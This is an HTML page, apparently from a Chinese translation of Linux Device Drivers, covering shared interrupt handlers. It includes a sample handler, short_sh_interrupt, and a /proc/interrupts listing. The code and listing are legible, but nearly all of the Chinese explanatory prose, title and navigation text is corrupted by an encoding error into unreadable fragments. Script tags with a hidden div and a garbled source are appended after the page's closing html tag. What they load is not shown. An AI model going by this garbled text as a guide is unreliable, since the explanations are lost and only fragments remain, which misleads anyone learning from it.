<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>10.4.&#160;жϹ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch10.html" title="&#160;10&#160;&#160;жϴ">
<link rel="prev" href="ch10s03.html" title="10.3.&#160;ǰͺ벿">
<link rel="next" href="ch10s05.html" title="10.5.&#160;ж I/O">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">10.4.&#160;жϹ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch10s03.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;10&#160;&#160;жϴ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch10s05.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="InterruptSharing.sect"></a>10.4.&#160;жϹ</h2></div></div></div>
<p>жϳͻĸ PC ϵͬ. ȥ,  PC ϵ IRQ ߲ܷһ豸, ǴӲ㹻. , ʧûѴʱ俪ǵļ, ҵһʹеһ.</p>
<p>ִӲ, Ȼ, ѾжϹ; PCI Ҫ. , Linux ں֧жϹ, Щ( ISA )ͳϲֵ֧. 2.6 ں˵豸Ӧдʹùж, ĿӲܹ֧ģʽ. ˵, ʹùжڴ󲿷ʱ׵.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="InstallingaSharedHandler.sect"></a>10.4.1.&#160;װһĴ</h3></div></div></div>
<p>жͨ request_irq װ񲻹һ,  2 ͬ:</p>
<div class="itemizedlist"><ul type="disc">
<li>SA_SHIRQ λ flags ָ, жʱ.<p></p>
</li>
<li><p>dev_id Ƕص. κģַռָ붼,  dev_id ȷزΪ NULL.</p></li>
</ul></div>
<p>ں˱һжĹб,  dev_id Ϊǵǩ.  2 Ҫͬһжע NULL Ϊǵǩ, жʱܾ, жϵʱں oops. , עṲжʱһ NULL dev_id , ִں˻Թ. һж, request_irq ɹ, ֮һ:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>ж߿.</p></li>
<li><p>ߵѾעĴҲָ IRQ.</p></li>
</ul></div>
<p>ۺʱ 2 ڹж, Ӳжжϴ, ںΪжϵÿעĴ,  dev_id ÿ. , һĴܹ߱ʶԼжϲӦ˳Լ豸ûбжʱ. ȷϷ IRQ_NONE ۺʱĴ߱òҷ豸ûж.</p>
<p>Ҫ̽豸,  IRQ ֮ǰ, ں޷. û̽⺯ɸʹ. ׼̽Чʹõǿе, Ѿһй, ̽ʧ, . ˵, 󲿷ΪжϹӲܹ֪ʹĸж, ˼Ե̽Ҫ.</p>
<p>ͷŴʽ, ʹ free_irq.  dev_id жϵĹбѡȷĴͷ. Ϊʲô dev_id ָǶص.</p>
<p>һʹùߵҪСĶһ: ʹ enable_irq  disable_irq. , ߵ豸; ֹһ豸жϼʱҲܲʱ, 豸û. ͨ, Աס, ӵ IRQ, ΪӦӵж߸"".</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="RunningtheHandler.sect"></a>10.4.2.&#160;д</h3></div></div></div>
<p>ͬǰ潨, ںյһж, еעĴ߱. һĴܹ߱ҪĴжϺ豸ж֮.</p>
<p>ʹ shared=1 ѡ short װдȱʡ:</p>
<pre class="programlisting">
irqreturn_t short_sh_interrupt(int irq, void *dev_id, struct pt_regs *regs) 
{
        int value, written;
        struct timeval tv;
        /* If it wasn't short, return immediately */
        value = inb(short_base);
        if (!(value &amp; 0x80))
                return IRQ_NONE;
        /* clear the interrupting bit */
        outb(value &amp; 0x7F, short_base);
        /* the rest is unchanged */
        do_gettimeofday(&amp;tv);
        written = sprintf((char *)short_head,"%08u.%06u\n",
                          (int)(tv.tv_sec % 100000000), (int)(tv.tv_usec));
        short_incr_bp(&amp;short_head, written);
        wake_up_interruptible(&amp;short_queue); /* awake any reading process */
        return IRQ_HANDLED;
}
</pre>
<p>Ӧи. Ϊû"жϹ"λ, ʹ ACK λĿ. λǸ, жǸ short, λ.</p>
<p>ͨݶ˿ڵλλ -- short ܽ 9  10 һ. һ short  IRQ 豸һж, short ȻǼʲô.</p>
<p>Ȼ, һȫܽλǰͺ벿, ӲҲκӰʵֹĴ. һʵʹ dev_id , ںܶܵ, ĸ豸ж.</p>
<p>ע, ʹôӡ()ʹ short жϹ, Ĵ߲˵һ,ΪӡЭ鲻, ֪ǷжԴӡ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheprocInterfaceandShardInterrupts.sect"></a>10.4.3.&#160;/proc ӿں͹ж</h3></div></div></div>
<p>ϵͳаװ߲Ӱ /proc/stat, ֪. , /proc/interrupts Ա仯.</p>
<p>ͬһжϺŵİװĴ߳ /proc/interrupts ͬһ. ( һ x86_64 ϵͳ)ʾ˹жϴʾ:</p>
<pre class="screen">
 CPU0
 0: 892335412 XT-PIC timer
 1: 453971 XT-PIC i8042
 2: 0 XT-PIC cascade
 5: 0 XT-PIC libata, ehci_hcd
 8: 0 XT-PIC rtc
 9: 0 XT-PIC acpi
 10: 11365067 XT-PIC ide2, uhci_hcd, uhci_hcd, SysKonnect SK-98xx, EMU10K1
 11: 4391962 XT-PIC uhci_hcd, uhci_hcd
 12: 224 XT-PIC i8042
 14: 2787721 XT-PIC ide0
 15: 203048 XT-PIC ide1
NMI: 41234
LOC: 892193503
ERR: 102
MIS: 0
</pre>
<p>ϵͳмж. IRQ 5  ATA  IEEE 1394 ; IRQ 10 м豸, һ IDE , 2  USB , һ̫ӿ, Լһ;  IRQ 11 Ҳ 2  USB ʹ.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch10s03.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch10.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch10s05.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">10.3.&#160;ǰͺ벿&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;10.5.&#160;ж I/O</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>